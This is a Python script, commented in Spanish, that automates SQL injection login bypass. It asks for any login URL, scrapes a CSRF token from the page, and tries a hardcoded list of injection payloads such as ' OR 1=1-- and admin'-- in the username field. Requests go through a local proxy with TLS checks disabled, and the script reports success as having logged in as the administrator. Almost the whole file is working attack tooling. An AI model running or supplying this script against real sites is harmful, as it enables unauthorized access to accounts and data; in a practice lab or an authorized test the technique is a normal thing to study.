import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

sqli_payloads = [
    "admin'--",
    "administrator'--",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "admin' OR '1'='1",
    "admin'--",
    "admin' OR '1'='1'--",
    "' OR '1'='1'--",
    "1' OR '1'='1'--",
    "' OR 'x'='x",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'/*",
    "admin' OR 1=1--",
]

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')

    csrf_keywords = ["csrf", "token", "csrf_token", "authenticity_token", "csrfmiddlewaretoken", "securetoken"]

    for keyword in csrf_keywords:
        csrf_input = soup.find("input", {"name": keyword})
        if csrf_input:
            csrf = csrf_input.get('value')
            print(f"CSRF token encontrado con el nombre '{keyword}': {csrf}")
            return csrf

    for keyword in csrf_keywords:
        meta_tag = soup.find("meta", {"name": keyword})
        if meta_tag:
            csrf = meta_tag.get('content')
            print(f"CSRF token encontrado en meta tag con el nombre '{keyword}': {csrf}")
            return csrf

    cookies = r.cookies.get_dict()
    for keyword in csrf_keywords:
        if keyword in cookies:
            csrf = cookies[keyword]
            print(f"CSRF token encontrado en las cookies con el nombre '{keyword}': {csrf}")
            return csrf
    
    for keyword in csrf_keywords:
        if keyword in r.text:
            print(f"Posible CSRF token encontrado en el texto: {keyword}")
            # Intentar extraer el valor manualmente si aparece
            csrf_pos = r.text.find(keyword)
            csrf_value_start = r.text.find("value=", csrf_pos)
            if csrf_value_start != -1:
                csrf_value_end = r.text.find('"', csrf_value_start + 7)
                csrf = r.text[csrf_value_start + 7:csrf_value_end]
                print(f"Token extraído: {csrf}")
                return csrf

    print("No se encontró el token CSRF después de varias búsquedas.")
    return None


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)

    if csrf is None:
        print("[-] No se pudo obtener el token CSRF.")
        return False

    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}

    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text

    success_messages = ["Log out", "home", "hola", "bienvenido", "dashboard", "perfil", "inicio"]

    if any(message in res for message in success_messages):
        return True
    else:
        return False


if __name__ == "__main__":
    url = input("Ingrese la URL del login que desea escanear: ").strip()

    s = requests.Session()

    for payload in sqli_payloads:
        print(f"Probando con el payload: {payload}")
        if exploit_sqli(s, url, payload):
            print(f'[+] ¡SQL injection exitosa con el payload "{payload}"! Hemos iniciado sesión como el usuario administrador.')
            break
    else:
        print('[-] Todas las inyecciones SQL fallaron.')
